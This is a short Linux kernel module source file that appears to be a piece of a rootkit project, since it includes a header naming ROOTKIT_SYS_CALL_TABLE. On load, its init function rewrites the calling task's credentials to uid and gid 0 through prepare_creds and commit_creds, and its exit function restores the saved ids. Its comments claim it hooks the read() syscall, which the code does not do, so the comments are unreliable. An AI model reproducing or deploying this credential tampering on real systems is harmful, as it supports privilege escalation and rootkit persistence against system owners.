#include <linux/module.h>   /* Needed by all modules */
#include <linux/unistd.h>   /* Needed for __NR_read */
#include <linux/reboot.h>   /* Needed for kernel_restart() */
#include "sysmap.h"   /* Needed for ROOTKIT_SYS_CALL_TABLE */

#include <linux/thread_info.h>
#include <linux/sched.h>

static void set_cred(void)
{
	struct cred *elevated = prepare_creds();

	elevated->suid = current->cred->uid;
	elevated->sgid = current->cred->gid;

	elevated->uid.val = 0;
	elevated->gid.val = 0;
	elevated->euid = elevated->uid;
	elevated->egid = elevated->gid;

	commit_creds(elevated);

	printk(KERN_INFO "saved uid: %d gid: %d\n", current->cred->suid.val, current->cred->sgid.val);
}

static void restore_cred(void)
{
	struct cred *lowered = prepare_creds();

	lowered->uid = current->cred->suid;
	lowered->gid = current->cred->sgid;
	lowered->euid = lowered->uid;
	lowered->egid = lowered->gid;

	lowered->suid.val = lowered->sgid.val = 0;

	commit_creds(lowered);

	printk(KERN_INFO "restored uid: %d gid: %d\n", current->cred->uid.val, current->cred->gid.val);

}

/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the read() syscall. */
static int __init interceptor_start(void)
{

	set_cred();

	printk(KERN_INFO "%s\n", "Hello");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original read() syscall. */
static void __exit interceptor_end(void)
{

	restore_cred();

	printk(KERN_INFO "%s\n", "Bye bye");

	return;
}

module_init(interceptor_start);
module_exit(interceptor_end);

MODULE_LICENSE("GPL");
